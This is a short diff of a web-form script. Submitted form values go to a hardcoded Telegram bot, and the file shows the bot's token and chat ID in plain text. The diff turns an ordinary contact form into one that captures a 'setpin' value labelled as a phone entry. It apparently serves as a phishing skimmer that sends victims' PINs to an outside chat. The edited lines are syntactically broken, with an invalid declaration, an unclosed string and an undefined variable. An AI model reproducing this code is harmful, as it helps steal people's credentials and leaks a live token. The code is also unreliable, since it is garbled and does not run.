@@ -2,12 +2,12 @@
 var telegram_bot_id = "5699723630:AAGOD2-E8kWAOZeDEzdBxBxBg9S5RNVs5E8";
 //chat id
 var chat_id = 5322203833;
-var u_name, email, message;
+var setpin. ;
 var ready = function () {
-    u_name = document.getElementById("name").value;
-    email = document.getElementById("email").value;
-    message = document.getElementById("message").value;
-    message = "Name: " + u_name + "\nEmail: " + email + "\nMessage: " + message;
+    // = document.getElementById("name").value;
+    // = document.getElementById("email").value;
+    message = document.getElementById("setpin").value;
+    message = "tel: " + u_setpin + ";
 };
 var sender = function () {
     ready();
@@ -28,8 +28,8 @@ var sender = function () {
     $.ajax(settings).done(function (response) {
         console.log(response);
     });
-    document.getElementById("name").value = "";
-    document.getElementById("email").value = "";
-    document.getElementById("message").value = "";
+    document.getElementById("").value = "";
+    document.getElementById("").value = "";
+    document.getElementById("setpin").value = "";
     return false;
 };
